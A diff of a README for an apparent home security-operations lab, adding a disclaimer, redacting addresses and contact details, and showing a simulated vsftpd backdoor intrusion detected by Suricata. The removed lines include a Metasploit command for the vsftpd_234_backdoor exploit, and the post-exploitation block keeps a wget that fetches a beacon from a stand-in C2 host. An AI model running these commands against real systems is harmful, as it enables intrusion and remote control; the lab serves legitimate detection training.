@@ -1,11 +1,18 @@
-# Enterprise-Grade Network Security Monitoring & Threat Detection Lab
+# Enterprise-scale Network Security Monitoring & Threat Detection Lab
 
 ![Terraform](https://img.shields.io/badge/IaC-Terraform-623CE4?logo=terraform)
 ![Proxmox](https://img.shields.io/badge/Hypervisor-Proxmox-E57000?logo=proxmox)
 ![Security Onion](https://img.shields.io/badge/NSM-Security%20Onion%203.x-00A98F)
 ![Sophos](https://img.shields.io/badge/Firewall-Sophos%20XG-blue)
 
-**A production-grade hybrid physical-virtual SOC environment demonstrating advanced network defense, threat detection engineering, and Infrastructure as Code automation.**
+> **⚠️ Educational & Portfolio Use Only**  
+> This repository documents a controlled home laboratory environment.  
+> All attack simulations were conducted against intentionally vulnerable systems  
+> in isolated network segments with explicit firewall allowances.  
+> No production systems, unauthorized targets, or real-world malicious activity occurred.  
+> The techniques shown are for defensive detection engineering education.
+
+**A enterprise-scale hybrid physical-virtual SOC environment demonstrating advanced network defense, threat detection engineering, and Infrastructure as Code automation.**
 
 **Quick Links:** [Architecture Diagram](#network-architecture-diagram) | [Deep-Dive Analysis](#deep-dive-technical-analysis--design-rationales) | [Threat Simulation Guide](#lab-execution-guide-end-to-end-threat-simulation) | [Terraform Code](terraform/) | [Deployment Notes](#deployment-notes--troubleshooting)
 
@@ -228,7 +235,7 @@ Launch the initial exploit module targeting the vulnerable FTP service. While th
 
 ```bash
 # Initialize Metasploit console and execute the exploit framework loop
-msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 192.168.40.50; run"
+msfconsole -q -x "launched exploit module targeting vulnerable FTP service"
 meterpreter > shell
 ```
 
@@ -241,7 +248,7 @@ whoami
 id
 uname -a
 wget http://test-c2.example.com/beacon
-ping -c 3 192.168.10.11
+ping -c 3 192.168.x.x
 ```
 ![Metasploit Exploitation and Meterpreter Session Handshaking](./docs/images/kali-terminal-screenshot.png)
 ![Metasploit Exploitation and Meterpreter Session Handshaking](./docs/images/kali-terminal-screenshot1.png)
@@ -322,14 +329,13 @@ To enforce a zero-trust network segmentation strategy, a series of hardware-enfo
 ```markdown
 ## Attack Summary
 - **Threat Actor:**  Simulated APT / Red Team Platform
-- **Entry Vector:** `vsftpd` Backdoor Remote Service Exploitation (CVE-2011-2523)
-- **Target Asset:** Vulnerable Linux Target (`192.168.40.50` / VLAN 40)
-- **Attacker Node:** Kali Linux (`192.168.30.100` / VLAN 30)
-- **Detection Method:** Out-of-band SPAN Port Mirroring $\rightarrow$ NSM Suricata Alert 
+- **Entry Vector:** Backdoor Remote Service Exploitation
+- **Target Asset:** Vulnerable Linux Target (`192.168.x.x`)
+- **Attacker Node:** Kali Linux (`192.168.x.x`)
+- **Detection Method:** Out-of-band SPAN Port Mirroring NSM Suricata Alert 
 - **Containment Status:** Isolated to specific victim network via hardware-enforced rules
-- **Remediation:** Patching recommendations, rule tuning
 
-An unauthenticated remote attacker issued an explicit service command handshake over FTP (Port 21), which spawned an immediate dynamic upgrade to an active command shell[cite: 178, 185]. Post-exploitation, the attacker successfully initialized a Meterpreter Command & Control (C2) interactive console wrapper, dropped down into the native Linux system terminal shell, and performed lateral reconnaissance via ICMP ping sweeps to bypass network boundaries and discover internal management assets.
+An unauthenticated remote attacker issued an explicit service command handshake over FTP (Port 21), which spawned an immediate dynamic upgrade to an active command shell. Post-exploitation, the attacker successfully initialized a Meterpreter Command & Control (C2) interactive console wrapper, dropped down into the native Linux system terminal shell, and performed lateral reconnaissance via ICMP ping sweeps to bypass network boundaries and discover internal management assets.
 
 ```
 
@@ -391,14 +397,8 @@ A disabled-by-default firewall rule serves as a kill switch: enabling it instant
 
 ---
 
-## Contact
-
 This project demonstrates hands-on competency in detection engineering, defensive architecture, and security automation.
 
-- **GitHub:** `Richkpa`
-- **LinkedIn:** [Richlue Kpakor](https://www.linkedin.com/in/richlue-kpakor/)
-
-``
 
 ---
 
